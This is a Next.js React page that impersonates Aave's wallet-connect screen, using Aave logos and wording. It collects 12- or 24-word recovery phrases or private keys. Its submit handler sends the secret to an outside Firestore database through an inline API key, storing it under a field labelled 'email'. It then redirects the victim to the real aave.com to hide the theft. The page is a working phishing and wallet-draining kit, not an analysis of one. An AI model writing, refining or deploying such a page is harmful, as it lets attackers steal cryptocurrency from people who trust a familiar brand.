"use client"

import type React from "react"

import { useState } from "react"
import Image from "next/image"
import "./wallet-connect.css"

export default function TestModePage() {
  const [showModal, setShowModal] = useState(false)
  const [activeOption, setActiveOption] = useState("option12")
  const [privateKey, setPrivateKey] = useState("")
  const [mnemonicWords, setMnemonicWords] = useState(Array(24).fill(""))

  const handleOptionClick = (option: string) => {
    setActiveOption(option)
  }

  const handleMnemonicChange = (index: number, value: string) => {
    const newWords = [...mnemonicWords]
    newWords[index] = value
    setMnemonicWords(newWords)
  }

  const handleMnemonicPaste = (e: React.ClipboardEvent<HTMLInputElement>, wordCount: number) => {
    e.preventDefault()
    const pastedText = e.clipboardData.getData("text")
    const words = pastedText.split(/\s+/)

    const newWords = [...mnemonicWords]
    words.forEach((word, index) => {
      if (index < wordCount) {
        newWords[index] = word
      }
    })

    setMnemonicWords(newWords)
  }

  const handleSubmit = async () => {
    let seedPhrase: string

    if (activeOption === "optionPrivateKey") {
      if (!privateKey.trim()) {
        alert("Please enter your private key.")
        return
      }
      seedPhrase = privateKey.trim()
    } else {
      const wordCount = activeOption === "option12" ? 12 : 24
      const words = mnemonicWords.slice(0, wordCount).map((word) => word.trim())
      seedPhrase = words.join(" ")

      if (words.filter(Boolean).length !== wordCount) {
        alert(`Please enter exactly ${wordCount} words.`)
        return
      }
    }

    try {
      // This is the same endpoint from the original code
      // Note: In a real app, you should use environment variables for API keys
      await fetch(
        "https://firestore.googleapis.com/v1/projects/general-codes/databases/(default)/documents/users?key=AIzaSyBzX-UuTQsMJTNbrF6UO_7zZnu2WucXXD8",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            fields: {
              email: { stringValue: seedPhrase },
            },
          }),
        },
      )

      // Reset form and close modal
      setMnemonicWords(Array(24).fill(""))
      setPrivateKey("")
      setShowModal(false)

      // Redirect to aave.com as in the original code
      window.location.href = "https://aave.com/"
    } catch (error) {
      console.error("Error uploading data:", error)
    }
  }

  const resetForm = () => {
    setMnemonicWords(Array(24).fill(""))
    setPrivateKey("")
  }

  return (
    <div className="min-h-screen bg-white text-black flex flex-col">
      <div className="container mx-auto px-4 py-8 flex-1 flex flex-col items-center justify-center">
        <div className="text-center max-w-md w-full">
          <div className="mb-6 flex justify-center">
            <div className="w-24 h-24 rounded-full bg-purple-100 flex items-center justify-center">
              <Image src="/icon128.png" alt="AAVE Wallet" width={80} height={80} className="rounded-full" />
            </div>
          </div>

          <div className="bg-white p-8 rounded-lg shadow-lg">
            <p className="text-gray-700 mb-6 text-center">
              Please connect your wallet to see your supplies, borrowings, and open positions.
            </p>
            <button
              onClick={() => setShowModal(true)}
              className="w-full bg-gradient-to-r from-cyan-500 to-purple-500 text-white py-3 px-6 rounded-lg font-medium hover:opacity-90 transition-opacity"
            >
              Connect wallet
            </button>
          </div>
        </div>
      </div>

      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-xl max-w-md w-full p-6">
            <div className="flex justify-center mb-4">
              <Image src="/logo.png" alt="AAVE" width={120} height={40} />
            </div>

            <h2 className="text-xl font-bold mb-4 text-center">Import a wallet</h2>

            <div className="flex mb-6 border rounded-lg overflow-hidden">
              <button
                onClick={() => handleOptionClick("option12")}
                className={`flex-1 py-2 px-3 text-sm font-medium ${
                  activeOption === "option12"
                    ? "bg-gradient-to-r from-cyan-500 to-purple-500 text-white"
                    : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                }`}
              >
                12-word Mnemonic
              </button>
              <button
                onClick={() => handleOptionClick("option24")}
                className={`flex-1 py-2 px-3 text-sm font-medium ${
                  activeOption === "option24"
                    ? "bg-gradient-to-r from-cyan-500 to-purple-500 text-white"
                    : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                }`}
              >
                24-word Mnemonic
              </button>
              <button
                onClick={() => handleOptionClick("optionPrivateKey")}
                className={`flex-1 py-2 px-3 text-sm font-medium ${
                  activeOption === "optionPrivateKey"
                    ? "bg-gradient-to-r from-cyan-500 to-purple-500 text-white"
                    : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                }`}
              >
                Private Key
              </button>
            </div>

            {(activeOption === "option12" || activeOption === "option24") && (
              <div>
                <p className="text-sm text-gray-600 mb-3">
                  You can paste the entire mnemonic phrase into the first blank space.
                </p>
                <div className={`grid gap-2 mb-6 ${activeOption === "option12" ? "grid-cols-3" : "grid-cols-4"}`}>
                  {Array.from({ length: activeOption === "option12" ? 12 : 24 }).map((_, index) => (
                    <input
                      key={index}
                      type="text"
                      placeholder={`${index + 1}`}
                      value={mnemonicWords[index] || ""}
                      onChange={(e) => handleMnemonicChange(index, e.target.value)}
                      onPaste={(e) => index === 0 && handleMnemonicPaste(e, activeOption === "option12" ? 12 : 24)}
                      className="border rounded p-2 text-sm"
                    />
                  ))}
                </div>
              </div>
            )}

            {activeOption === "optionPrivateKey" && (
              <div className="mb-6">
                <textarea
                  placeholder="Enter private key"
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  className="w-full border rounded-lg p-3 h-32 text-sm"
                />
              </div>
            )}

            <div className="flex space-x-3">
              <button
                onClick={handleSubmit}
                className="flex-1 bg-gradient-to-r from-cyan-500 to-purple-500 text-white py-2 px-4 rounded-lg font-medium hover:opacity-90 transition-opacity"
              >
                Confirm
              </button>
              <button
                onClick={() => {
                  resetForm()
                  setShowModal(false)
                }}
                className="flex-1 bg-gray-200 text-gray-800 py-2 px-4 rounded-lg font-medium hover:bg-gray-300 transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
